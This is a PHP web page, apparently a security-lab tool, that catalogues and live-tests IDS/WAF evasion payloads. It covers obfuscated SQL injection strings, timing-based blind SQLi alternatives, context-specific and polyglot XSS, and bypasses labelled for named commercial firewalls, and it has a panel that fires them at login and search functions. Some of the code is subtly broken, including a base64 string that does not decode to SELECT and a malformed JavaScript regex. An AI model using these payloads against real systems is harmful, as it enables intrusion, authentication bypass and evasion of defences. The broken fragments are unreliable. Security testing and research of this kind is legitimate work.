<?php
session_start();
require_once 'config/database.php';
require_once 'includes/functions.php';
require_once 'evasion_engine.php';

// Master Evasion Demonstration
$demo_results = [];
$current_demo = $_GET['demo'] ?? 'overview';

function demonstrateCharacterObfuscation()
{
    $original = "' OR 1=1--";

    return [
        'original' => $original,
        'techniques' => [
            'ascii_codes' => chr(39) . chr(32) . chr(79) . chr(82) . chr(32) . chr(49) . chr(61) . chr(49) . chr(45) . chr(45),
            'hex_encoding' => '0x27204F522031203D2031202D2D',
            'unicode_escape' => '\u0027 \u004F\u0052 \u0031\u003D\u0031\u002D\u002D',
            'base64_encoding' => base64_encode($original),
            'url_encoding' => rawurlencode($original),
            'double_url_encoding' => rawurlencode(rawurlencode($original)),
            'mixed_case' => "' oR 1=1--",
            'comment_injection' => "'/**/OR/**/1=1--",
            'whitespace_variation' => "'\tOR\n1=1--",
            'string_concatenation' => "' + 'OR' + ' 1=1--"
        ],
        'explanation' => 'Character-level obfuscation breaks pattern matching by encoding the malicious payload in various formats while preserving functionality.'
    ];
}

function demonstrateProtocolLevelEvasion()
{
    return [
        'technique' => 'HTTP Protocol Manipulation',
        'methods' => [
            'parameter_pollution' => [
                'description' => 'Split payload across multiple parameters',
                'example' => "q='&q= OR 1&q==1--",
                'headers' => ['Content-Type: application/x-www-form-urlencoded']
            ],
            'header_injection' => [
                'description' => 'Inject payloads in HTTP headers',
                'example' => 'X-Forwarded-For: 127.0.0.1\' OR 1=1--',
                'headers' => ['X-Custom-Header: <script>alert(1)</script>']
            ],
            'content_type_confusion' => [
                'description' => 'Use unexpected content types',
                'example' => 'application/json with SQL in JSON values',
                'headers' => ['Content-Type: application/json', 'Content-Type: text/xml']
            ],
            'transfer_encoding' => [
                'description' => 'Abuse transfer encoding',
                'example' => 'Transfer-Encoding: chunked with malicious chunks',
                'headers' => ['Transfer-Encoding: chunked']
            ]
        ],
        'explanation' => 'Protocol-level evasion exploits differences in how web servers, proxies, and IDS systems parse HTTP requests.'
    ];
}

function demonstrateDynamicQueryConstruction()
{
    global $pdo;

    $payload = "admin' OR '1'='1'--";

    // Method 1: Variable-based construction
    $s = 'S';
    $e = 'E';
    $l = 'L';
    $e2 = 'E';
    $c = 'C';
    $t = 'T';
    $select = $s . $e . $l . $e2 . $c . $t;

    $f = 'F';
    $r = 'R';
    $o = 'O';
    $m = 'M';
    $from = $f . $r . $o . $m;

    $w = 'W';
    $h = 'H';
    $e3 = 'E';
    $r2 = 'R';
    $e4 = 'E';
    $where = $w . $h . $e3 . $r2 . $e4;

    // Method 2: Function-based construction
    $sqlParts = [
        base64_decode('U0VMRUNJ'), // SELECT
        base64_decode('Kg=='),     // *
        base64_decode('RlJPTQ=='), // FROM
        'users',
        base64_decode('V0hFUkU='), // WHERE
        "username = '$payload'"
    ];

    $query = implode(' ', $sqlParts);

    // Method 3: Character code arrays
    $selectChars = [83, 69, 76, 69, 67, 84]; // SELECT
    $selectWord = implode('', array_map('chr', $selectChars));

    return [
        'methods' => [
            'variable_construction' => $select . ' * ' . $from . ' users ' . $where . " username = '$payload'",
            'base64_parts' => $query,
            'char_codes' => $selectWord . " * FROM users WHERE username = '$payload'",
            'array_assembly' => implode('', array_map('chr', [83, 69, 76, 69, 67, 84, 32, 42, 32, 70, 82, 79, 77, 32, 117, 115, 101, 114, 115]))
        ],
        'explanation' => 'Dynamic construction prevents static analysis by building malicious queries at runtime using legitimate string operations.'
    ];
}

function demonstrateTimingAttackEvasion()
{
    return [
        'original_attack' => "' AND (SELECT SLEEP(5))--",
        'alternatives' => [
            'benchmark' => "' AND (SELECT BENCHMARK(5000000,SHA1(1)))--",
            'heavy_query' => "' AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--",
            'regex_delay' => "' AND (SELECT 'a' REGEXP CONCAT(REPEAT('(',500000),'a',REPEAT(')',500000)))--",
            'get_lock' => "' AND (SELECT GET_LOCK('test',5))--",
            'mathematical' => "' AND (SELECT * FROM (SELECT(POW(999999,999999)))a)--",
            'name_const' => "' AND (SELECT NAME_CONST(SLEEP(5),1))--"
        ],
        'explanation' => 'Timing attack evasion uses alternative functions that cause delays without triggering SLEEP() detection rules.'
    ];
}

function demonstrateContextSpecificXSS()
{
    return [
        'contexts' => [
            'html_context' => [
                'original' => '<script>alert(1)</script>',
                'evaded' => [
                    'char_codes' => '<script>alert(String.fromCharCode(88,83,83))</script>',
                    'hex_escape' => '<script>alert(\x58\x53\x53)</script>',
                    'unicode' => '<script>alert(\u0058\u0053\u0053)</script>',
                    'base64_eval' => '<script>eval(atob("YWxlcnQoMSk="))</script>'
                ]
            ],
            'attribute_context' => [
                'original' => '" onmouseover="alert(1)"',
                'evaded' => [
                    'event_fragmentation' => '" on' . 'mouseover="alert(1)"',
                    'unicode_in_attr' => '" onmouseover="alert(\u0031)"',
                    'js_escape' => '" onmouseover="alert(\'\\x31\')"'
                ]
            ],
            'javascript_context' => [
                'original' => '\';alert(1);//',
                'evaded' => [
                    'template_literal' => '`${alert(1)}`',
                    'function_constructor' => '(function(){alert(1)})()',
                    'eval_alternative' => 'window["ev"+"al"]("alert(1)")'
                ]
            ],
            'css_context' => [
                'original' => 'expression(alert(1))',
                'evaded' => [
                    'url_scheme' => 'url(javascript:alert(1))',
                    'import_directive' => '@import javascript:alert(1)',
                    'background_url' => 'background:url(javascript:alert(1))'
                ]
            ]
        ],
        'explanation' => 'Context-specific evasion adapts payloads to the injection point context (HTML, attribute, JavaScript, CSS) for maximum effectiveness.'
    ];
}

function demonstratePolyglotPayloads()
{
    return [
        'universal_polyglot' => 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>',
        'sql_xss_combo' => '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"\'>alert(String.fromCharCode(88,83,83))</SCRIPT>',
        'multi_language' => '${@print(md5(hello))}${@print(md5("hello"))}#{print(md5("hello"))}',
        'context_breaking' => '">\'><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>',
        'explanation' => 'Polyglot payloads work across multiple contexts and languages, making them harder to detect with single-context rules.'
    ];
}

function demonstrateAdvancedWAFBypass()
{
    return [
        'cloudflare_bypass' => [
            'double_encoding' => '%2527%2520UNION%2520SELECT',
            'unicode_normalization' => 'UNI%C0%AFON SELECT',
            'http_splitting' => "GET /search?q=test HTTP/1.1\r\nX-Inject: ' OR 1=1--"
        ],
        'akamai_bypass' => [
            'chunked_transfer' => "5\r\nUNION\r\n6\r\nSELECT\r\n0\r\n\r\n",
            'content_length_abuse' => 'Content-Length: 0\r\n\r\nGET /admin',
            'case_sensitivity' => 'UnIoN sElEcT'
        ],
        'aws_waf_bypass' => [
            'json_injection' => '{"query": "UNI\\u004fN SELECT"}',
            'xml_cdata' => '<![CDATA[UNION SELECT]]>',
            'base64_split' => base64_encode('UNI') . base64_encode('ON SELECT')
        ],
        'generic_waf_bypass' => [
            'comment_variations' => 'UNI/**/ON/**\//SEL/**/ECT',
            'alternative_operators' => '\' || 1 LIKE 1 #',
            'nested_encoding' => base64_encode(rawurlencode("' OR 1=1--"))
        ],
        'explanation' => 'WAF-specific bypasses exploit parsing differences and specific rule limitations in commercial web application firewalls.'
    ];
}

// Handle AJAX requests for live demonstrations
if ($_POST['action'] ?? false) {
    header('Content-Type: application/json');

    $action = $_POST['action'];
    $payload = $_POST['payload'] ?? '';

    switch ($action) {
        case 'test_search':
            try {
                $results = searchPosts($payload);
                echo json_encode([
                    'success' => true,
                    'results' => count($results),
                    'executed' => true,
                    'response_preview' => 'Search completed with ' . count($results) . ' results'
                ]);
            } catch (Exception $e) {
                echo json_encode([
                    'success' => false,
                    'error' => $e->getMessage(),
                    'sql_error' => true
                ]);
            }
            break;

        case 'test_login':
            try {
                $user = authenticateUser($payload, 'dummy_password');
                echo json_encode([
                    'success' => true,
                    'bypass_successful' => $user !== false,
                    'user_found' => $user ? true : false
                ]);
            } catch (Exception $e) {
                echo json_encode([
                    'success' => false,
                    'error' => $e->getMessage()
                ]);
            }
            break;

        case 'analyze_payload':
            $analysis = [
                'original_length' => strlen($payload),
                'encoded_variants' => [
                    'base64' => base64_encode($payload),
                    'url_encoded' => rawurlencode($payload),
                    'hex' => bin2hex($payload)
                ],
                'detection_evasion' => EvasionEngine::analyzeDetectionEvasion($payload),
                'complexity_score' => calculateComplexityScore($payload)
            ];
            echo json_encode($analysis);
            break;

        default:
            echo json_encode(['error' => 'Unknown action']);
    }
    exit;
}

function calculateComplexityScore($payload)
{
    $score = 0;

    // Length factor
    $score += min(strlen($payload) / 10, 10);

    // Character diversity
    $uniqueChars = count_chars($payload, 3);
    $score += min(strlen($uniqueChars) / 5, 20);

    // Encoding complexity
    if (base64_encode(base64_decode($payload, true)) === $payload) $score += 15;
    if (strpos($payload, '\\u') !== false) $score += 10;
    if (strpos($payload, '\\x') !== false) $score += 10;
    if (strpos($payload, '%') !== false) $score += 5;

    // Obfuscation techniques
    if (strpos($payload, '/*') !== false) $score += 10;
    if (preg_match('/chr\s*\(/i', $payload)) $score += 15;
    if (preg_match('/String\.fromCharCode/i', $payload)) $score += 15;

    return min($score, 100);
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🥷 Master Evasion Demonstration</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-dark.min.css" rel="stylesheet">
    <style>
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
        }

        .master-container {
            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
            border: 2px solid #00ff00;
        }

        .technique-card {
            background: #1e1e1e;
            border: 1px solid #333;
            transition: all 0.3s;
        }

        .technique-card:hover {
            border-color: #00ff00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
        }

        .payload-demo {
            background: #000;
            padding: 15px;
            border-radius: 5px;
            border: 1px solid #444;
        }

        .evasion-level-1 {
            border-left: 4px solid #28a745;
        }

        .evasion-level-2 {
            border-left: 4px solid #ffc107;
        }

        .evasion-level-3 {
            border-left: 4px solid #fd7e14;
        }

        .evasion-level-4 {
            border-left: 4px solid #dc3545;
        }

        .live-demo {
            background: #1a1a2e;
            border: 2px solid #16213e;
        }

        .matrix-text {
            color: #00ff41;
            text-shadow: 0 0 5px #00ff41;
        }

        .cyber-glow {
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.4);
        }

        .nav-pills .nav-link.active {
            background-color: #00ff00;
            color: #000;
        }

        .nav-pills .nav-link {
            color: #00ff00;
        }

        .btn-cyber {
            background: linear-gradient(45deg, #00ff00, #00cc00);
            color: #000;
            border: none;
        }

        .btn-cyber:hover {
            background: linear-gradient(45deg, #00cc00, #009900);
        }

        .result-success {
            color: #00ff00;
        }

        .result-warning {
            color: #ffaa00;
        }

        .result-danger {
            color: #ff4444;
        }
    </style>
</head>

<body>
    <div class="container-fluid p-4">
        <div class="master-container rounded p-4">

            <!-- Header -->
            <div class="text-center mb-4">
                <h1 class="matrix-text cyber-glow">🥷 MASTER EVASION DEMONSTRATION 🥷</h1>
                <p class="lead">Advanced IDS/IPS Bypass Techniques - Live Interactive Demo</p>
                <div class="alert alert-warning">
                    <i class="fas fa-exclamation-triangle"></i>
                    <strong>WARNING:</strong> This demonstration showcases real attack techniques. Use only in authorized testing environments.
                </div>
            </div>

            <!-- Navigation -->
            <ul class="nav nav-pills justify-content-center mb-4" id="demo-tabs" role="tablist">
                <li class="nav-item" role="presentation">
                    <button class="nav-link active" data-bs-toggle="pill" data-bs-target="#character-obfuscation">
                        <i class="fas fa-code"></i> Character Obfuscation
                    </button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" data-bs-toggle="pill" data-bs-target="#protocol-evasion">
                        <i class="fas fa-network-wired"></i> Protocol Evasion
                    </button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" data-bs-toggle="pill" data-bs-target="#dynamic-construction">
                        <i class="fas fa-cogs"></i> Dynamic Construction
                    </button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" data-bs-toggle="pill" data-bs-target="#timing-evasion">
                        <i class="fas fa-clock"></i> Timing Evasion
                    </button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" data-bs-toggle="pill" data-bs-target="#context-xss">
                        <i class="fas fa-shield-alt"></i> Context XSS
                    </button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" data-bs-toggle="pill" data-bs-target="#polyglot">
                        <i class="fas fa-rocket"></i> Polyglot
                    </button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" data-bs-toggle="pill" data-bs-target="#waf-bypass">
                        <i class="fas fa-fire"></i> WAF Bypass
                    </button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" data-bs-toggle="pill" data-bs-target="#live-testing">
                        <i class="fas fa-play-circle"></i> Live Testing
                    </button>
                </li>
            </ul>

            <!-- Tab Content -->
            <div class="tab-content" id="demo-content">

                <!-- Character Obfuscation -->
                <div class="tab-pane fade show active" id="character-obfuscation">
                    <h3><i class="fas fa-code"></i> Character-Level Obfuscation</h3>
                    <?php $demo = demonstrateCharacterObfuscation(); ?>

                    <div class="row">
                        <div class="col-md-4">
                            <div class="technique-card p-3 mb-3">
                                <h5>Original Payload</h5>
                                <div class="payload-demo">
                                    <code class="result-danger"><?php echo htmlspecialchars($demo['original']); ?></code>
                                </div>
                                <p class="mt-2 text-muted">Easily detected by signature-based rules</p>
                            </div>
                        </div>

                        <div class="col-md-8">
                            <h5>Evasion Techniques</h5>
                            <div class="row">
                                <?php foreach ($demo['techniques'] as $name => $payload): ?>
                                    <div class="col-md-6 mb-3">
                                        <div class="technique-card evasion-level-<?php echo rand(1, 4); ?> p-3 h-100">
                                            <h6><?php echo ucwords(str_replace('_', ' ', $name)); ?></h6>
                                            <div class="payload-demo">
                                                <code class="result-success" style="font-size: 0.8em;"><?php echo htmlspecialchars(substr($payload, 0, 60)); ?><?php echo strlen($payload) > 60 ? '...' : ''; ?></code>
                                            </div>
                                            <button class="btn btn-sm btn-cyber mt-2" onclick="testPayload('<?php echo addslashes($payload); ?>', 'search')">
                                                <i class="fas fa-vial"></i> Test
                                            </button>
                                        </div>
                                    </div>
                                <?php endforeach; ?>
                            </div>
                        </div>
                    </div>

                    <div class="alert alert-info">
                        <strong>Technique Explanation:</strong> <?php echo $demo['explanation']; ?>
                    </div>
                </div>

                <!-- Protocol Evasion -->
                <div class="tab-pane fade" id="protocol-evasion">
                    <h3><i class="fas fa-network-wired"></i> Protocol-Level Evasion</h3>
                    <?php $demo = demonstrateProtocolLevelEvasion(); ?>

                    <div class="row">
                        <?php foreach ($demo['methods'] as $method => $data): ?>
                            <div class="col-md-6 mb-4">
                                <div class="technique-card p-3 h-100">
                                    <h5><?php echo ucwords(str_replace('_', ' ', $method)); ?></h5>
                                    <p class="text-muted"><?php echo $data['description']; ?></p>

                                    <div class="payload-demo mb-3">
                                        <strong>Example:</strong><br>
                                        <code class="result-warning"><?php echo htmlspecialchars($data['example']); ?></code>
                                    </div>

                                    <div class="payload-demo">
                                        <strong>Headers:</strong><br>
                                        <?php foreach ($data['headers'] as $header): ?>
                                            <code class="result-success"><?php echo htmlspecialchars($header); ?></code><br>
                                        <?php endforeach; ?>
                                    </div>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    </div>

                    <div class="alert alert-info">
                        <strong>Technique Explanation:</strong> <?php echo $demo['explanation']; ?>
                    </div>
                </div>

                <!-- Dynamic Construction -->
                <div class="tab-pane fade" id="dynamic-construction">
                    <h3><i class="fas fa-cogs"></i> Dynamic Query Construction</h3>
                    <?php $demo = demonstrateDynamicQueryConstruction(); ?>

                    <div class="row">
                        <?php foreach ($demo['methods'] as $method => $query): ?>
                            <div class="col-12 mb-3">
                                <div class="technique-card p-3">
                                    <h5><?php echo ucwords(str_replace('_', ' ', $method)); ?></h5>
                                    <div class="payload-demo">
                                        <code class="result-warning"><?php echo htmlspecialchars($query); ?></code>
                                    </div>
                                    <button class="btn btn-sm btn-cyber mt-2" onclick="testPayload('<?php echo addslashes($query); ?>', 'login')">
                                        <i class="fas fa-vial"></i> Test Construction
                                    </button>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    </div>

                    <div class="alert alert-info">
                        <strong>Technique Explanation:</strong> <?php echo $demo['explanation']; ?>
                    </div>
                </div>

                <!-- Timing Evasion -->
                <div class="tab-pane fade" id="timing-evasion">
                    <h3><i class="fas fa-clock"></i> Timing Attack Evasion</h3>
                    <?php $demo = demonstrateTimingAttackEvasion(); ?>

                    <div class="technique-card p-3 mb-3">
                        <h5>Original Attack (Easily Detected)</h5>
                        <div class="payload-demo">
                            <code class="result-danger"><?php echo htmlspecialchars($demo['original_attack']); ?></code>
                        </div>
                    </div>

                    <h5>Alternative Techniques</h5>
                    <div class="row">
                        <?php foreach ($demo['alternatives'] as $name => $payload): ?>
                            <div class="col-md-6 mb-3">
                                <div class="technique-card evasion-level-3 p-3 h-100">
                                    <h6><?php echo ucwords(str_replace('_', ' ', $name)); ?></h6>
                                    <div class="payload-demo">
                                        <code class="result-success" style="font-size: 0.8em;"><?php echo htmlspecialchars($payload); ?></code>
                                    </div>
                                    <button class="btn btn-sm btn-cyber mt-2" onclick="testPayload('<?php echo addslashes($payload); ?>', 'search')">
                                        <i class="fas fa-stopwatch"></i> Test Timing
                                    </button>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    </div>

                    <div class="alert alert-info">
                        <strong>Technique Explanation:</strong> <?php echo $demo['explanation']; ?>
                    </div>
                </div>

                <!-- Context XSS -->
                <div class="tab-pane fade" id="context-xss">
                    <h3><i class="fas fa-shield-alt"></i> Context-Specific XSS</h3>
                    <?php $demo = demonstrateContextSpecificXSS(); ?>

                    <?php foreach ($demo['contexts'] as $context => $data): ?>
                        <div class="technique-card p-3 mb-4">
                            <h5><?php echo ucwords(str_replace('_', ' ', $context)); ?></h5>

                            <div class="row">
                                <div class="col-md-4">
                                    <div class="payload-demo mb-3">
                                        <strong>Original:</strong><br>
                                        <code class="result-danger"><?php echo htmlspecialchars($data['original']); ?></code>
                                    </div>
                                </div>

                                <div class="col-md-8">
                                    <strong>Evaded Versions:</strong>
                                    <div class="row">
                                        <?php foreach ($data['evaded'] as $technique => $payload): ?>
                                            <div class="col-md-6 mb-2">
                                                <div class="payload-demo">
                                                    <small class="text-muted"><?php echo ucwords(str_replace('_', ' ', $technique)); ?>:</small><br>
                                                    <code class="result-success" style="font-size: 0.75em;"><?php echo htmlspecialchars($payload); ?></code>
                                                </div>
                                            </div>
                                        <?php endforeach; ?>
                                    </div>
                                </div>
                            </div>
                        </div>
                    <?php endforeach; ?>

                    <div class="alert alert-info">
                        <strong>Technique Explanation:</strong> <?php echo $demo['explanation']; ?>
                    </div>
                </div>

                <!-- Polyglot -->
                <div class="tab-pane fade" id="polyglot">
                    <h3><i class="fas fa-rocket"></i> Polyglot Payloads</h3>
                    <?php $demo = demonstratePolyglotPayloads(); ?>

                    <div class="row">
                        <div class="col-12 mb-3">
                            <div class="technique-card evasion-level-4 p-3">
                                <h5>Universal Polyglot</h5>
                                <div class="payload-demo">
                                    <code class="result-warning" style="word-break: break-all;"><?php echo htmlspecialchars($demo['universal_polyglot']); ?></code>
                                </div>
                                <p class="mt-2 text-muted">Works in HTML, JavaScript, and CSS contexts</p>
                            </div>
                        </div>

                        <div class="col-12 mb-3">
                            <div class="technique-card evasion-level-4 p-3">
                                <h5>SQL + XSS Combo</h5>
                                <div class="payload-demo">
                                    <code class="result-danger" style="word-break: break-all;"><?php echo htmlspecialchars($demo['sql_xss_combo']); ?></code>
                                </div>
                                <p class="mt-2 text-muted">Combines SQL injection and XSS in single payload</p>
                            </div>
                        </div>

                        <div class="col-12 mb-3">
                            <div class="technique-card evasion-level-3 p-3">
                                <h5>Context Breaking</h5>
                                <div class="payload-demo">
                                    <code class="result-success" style="word-break: break-all;"><?php echo htmlspecialchars($demo['context_breaking']); ?></code>
                                </div>
                                <p class="mt-2 text-muted">Breaks out of multiple HTML contexts</p>
                            </div>
                        </div>
                    </div>

                    <div class="alert alert-info">
                        <strong>Technique Explanation:</strong> <?php echo $demo['explanation']; ?>
                    </div>
                </div>

                <!-- WAF Bypass -->
                <div class="tab-pane fade" id="waf-bypass">
                    <h3><i class="fas fa-fire"></i> WAF-Specific Bypasses</h3>
                    <?php $demo = demonstrateAdvancedWAFBypass(); ?>

                    <div class="row">
                        <?php foreach ($demo as $waf => $techniques): ?>
                            <?php if ($waf === 'explanation') continue; ?>
                            <div class="col-md-6 mb-4">
                                <div class="technique-card p-3 h-100">
                                    <h5><?php echo ucwords(str_replace('_', ' ', $waf)); ?></h5>

                                    <?php foreach ($techniques as $technique => $payload): ?>
                                        <div class="mb-3">
                                            <strong><?php echo ucwords(str_replace('_', ' ', $technique)); ?>:</strong>
                                            <div class="payload-demo">
                                                <code class="result-warning" style="font-size: 0.8em;"><?php echo htmlspecialchars($payload); ?></code>
                                            </div>
                                        </div>
                                    <?php endforeach; ?>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    </div>

                    <div class="alert alert-info">
                        <strong>Technique Explanation:</strong> <?php echo $demo['explanation']; ?>
                    </div>
                </div>

                <!-- Live Testing -->
                <div class="tab-pane fade" id="live-testing">
                    <h3><i class="fas fa-play-circle"></i> Live Interactive Testing</h3>

                    <div class="row">
                        <div class="col-md-6">
                            <div class="live-demo p-3 rounded">
                                <h5>Payload Tester</h5>

                                <div class="mb-3">
                                    <label>Select Target:</label>
                                    <select class="form-select" id="testTarget">
                                        <option value="search">Search Function</option>
                                        <option value="login">Login Function</option>
                                        <option value="profile">Profile Update</option>
                                    </select>
                                </div>

                                <div class="mb-3">
                                    <label>Payload:</label>
                                    <textarea class="form-control" id="testPayload" rows="3"
                                        placeholder="Enter your payload here..."></textarea>
                                </div>

                                <div class="d-grid gap-2">
                                    <button class="btn btn-cyber" onclick="runLiveTest()">
                                        <i class="fas fa-rocket"></i> Execute Test
                                    </button>
                                    <button class="btn btn-outline-success" onclick="analyzePayload()">
                                        <i class="fas fa-search"></i> Analyze Payload
                                    </button>
                                </div>
                            </div>
                        </div>

                        <div class="col-md-6">
                            <div class="live-demo p-3 rounded">
                                <h5>Test Results</h5>
                                <div id="testResults" style="min-height: 200px; max-height: 400px; overflow-y: auto;">
                                    <div class="text-muted text-center p-4">
                                        No tests executed yet. Use the panel on the left to run tests.
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Quick Test Buttons -->
                    <div class="mt-4">
                        <h5>Quick Tests</h5>
                        <div class="row">
                            <div class="col-md-3">
                                <button class="btn btn-outline-warning w-100 mb-2" onclick="quickTest('basic_sql')">
                                    Basic SQL Injection
                                </button>
                            </div>
                            <div class="col-md-3">
                                <button class="btn btn-outline-warning w-100 mb-2" onclick="quickTest('obfuscated_sql')">
                                    Obfuscated SQL
                                </button>
                            </div>
                            <div class="col-md-3">
                                <button class="btn btn-outline-warning w-100 mb-2" onclick="quickTest('basic_xss')">
                                    Basic XSS
                                </button>
                            </div>
                            <div class="col-md-3">
                                <button class="btn btn-outline-warning w-100 mb-2" onclick="quickTest('advanced_xss')">
                                    Advanced XSS
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Footer -->
            <div class="text-center mt-5 pt-4 border-top border-success">
                <p class="matrix-text">
                    🥷 Master Evasion Demonstration - Advanced IDS/IPS Bypass Techniques 🥷<br>
                    <small>For authorized security testing purposes only</small>
                </p>
            </div>
        </div>
    </div>

    <!-- Scripts -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
    <script>
    // Quick test payloads
    const quickPayloads = {
            'basic_sql': "' OR 1=1--",
            'obfuscated_sql': "' /**/OR/**/ 1=1--",
            'basic_xss': `<script>alert('XSS')<\/script>`,
            'advanced_xss': `<script>
            alert(String.fromCharCode(88, 83, 83))
        <\/script>`
    };

    // Test individual payload
    function testPayload(payload, target) {
    document.getElementById('testPayload').value = payload;
    document.getElementById('testTarget').value = target;
    runLiveTest();
    }

    // Quick test function
    function quickTest(type) {
    if (quickPayloads[type]) {
    document.getElementById('testPayload').value = quickPayloads[type];
    document.getElementById('testTarget').value = type.includes('sql') ? 'login' : 'search';
    runLiveTest();
    }
    }

    // Run live test
    async function runLiveTest() {
    const payload = document.getElementById('testPayload').value;
    const target = document.getElementById('testTarget').value;

    if (!payload.trim()) {
    alert('Please enter a payload to test');
    return;
    }

    const resultsDiv = document.getElementById('testResults');

    // Show loading
    const loadingHtml = `
    <div class="alert alert-info">
        <i class="fas fa-spinner fa-spin"></i> Testing payload against ${target}...
    </div>
    `;

    if (resultsDiv.innerHTML.includes('No tests executed')) {
    resultsDiv.innerHTML = loadingHtml;
    } else {
    resultsDiv.innerHTML = loadingHtml + resultsDiv.innerHTML;
    }

    try {
    const formData = new FormData();
    formData.append('action', target === 'search' ? 'test_search' : 'test_login');
    formData.append('payload', payload);

    const response = await fetch('', {
    method: 'POST',
    body: formData
    });

    const result = await response.json();
    displayTestResult(payload, target, result);

    } catch (error) {
    console.error('Test failed:', error);
    displayTestResult(payload, target, {success: false, error: error.message});
    }
    }

    // Analyze payload
    async function analyzePayload() {
    const payload = document.getElementById('testPayload').value;

    if (!payload.trim()) {
    alert('Please enter a payload to analyze');
    return;
    }

    try {
    const formData = new FormData();
    formData.append('action', 'analyze_payload');
    formData.append('payload', payload);

    const response = await fetch('', {
    method: 'POST',
    body: formData
    });

    const analysis = await response.json();
    displayAnalysisResult(payload, analysis);

    } catch (error) {
    console.error('Analysis failed:', error);
    }
    }

    // Display test result
    function displayTestResult(payload, target, result) {
    const resultsDiv = document.getElementById('testResults');

    let statusClass = result.success ? 'success' : 'danger';
    let statusIcon = result.success ? 'check-circle' : 'times-circle';

    const resultHtml = `
    <div class="alert alert-${statusClass} mb-3">
        <div class="d-flex justify-content-between align-items-start">
            <div class="flex-grow-1">
                <h6><i class="fas fa-${statusIcon}"></i> ${target.toUpperCase()} Test</h6>
                <div class="payload-demo mb-2">
                    <code>${payload.substring(0, 100)}${payload.length > 100 ? '...' : ''}</code>
                </div>
                <div class="small">
                    ${result.success ?
                    `✅ Test executed successfully` :
                    `❌ Test failed: ${result.error || 'Unknown error'}`
                    }
                    ${result.bypass_successful ? '<br>🔓 Authentication bypassed!' : ''}
                    ${result.sql_error ? '<br>💥 SQL error detected' : ''}
                    ${result.results !== undefined ? `<br>📊 Results count: ${result.results}` : ''}
                </div>
            </div>
            <small class="text-muted">${new Date().toLocaleTimeString()}</small>
        </div>
    </div>
    `;

    resultsDiv.innerHTML = resultHtml + resultsDiv.innerHTML.replace(/<div class="alert alert-info">.*?<\ /div> '');
            }

            // Display analysis result
            function displayAnalysisResult(payload, analysis) {
            const resultsDiv = document.getElementById('testResults');

            const resultHtml = `
            <div class="alert alert-info mb-3">
                <h6><i class="fas fa-microscope"></i> Payload Analysis</h6>
                <div class="payload-demo mb-2">
                    <code>${payload.substring(0, 100)}${payload.length > 100 ? '...' : ''}</code>
                </div>
                <div class="row">
                    <div class="col-md-6">
                        <strong>Statistics:</strong>
                        <ul class="small mb-0">
                            <li>Length: ${analysis.original_length} chars</li>
                            <li>Complexity Score: ${analysis.complexity_score}/100</li>
                            <li>Base64 Encoded: ${analysis.encoded_variants.base64.substring(0, 20)}...</li>
                        </ul>
                    </div>
                    <div class="col-md-6">
                        <strong>Detection Evasion:</strong>
                        <ul class="small mb-0">
                            <li>Evasion Score: ${analysis.detection_evasion?.evasion_percentage || 'N/A'}%</li>
                            <li>Likely Undetected: ${analysis.detection_evasion?.likely_undetected ? '✅' : '❌'}</li>
                        </ul>
                    </div>
                </div>
                <small class="text-muted">${new Date().toLocaleTimeString()}</small>
            </div>
            `;

            resultsDiv.innerHTML = resultHtml + resultsDiv.innerHTML;
            }

            // Auto-highlight code blocks
            document.addEventListener('DOMContentLoaded', function() {
            Prism.highlightAll();
            });
            </script>
</body>

</html>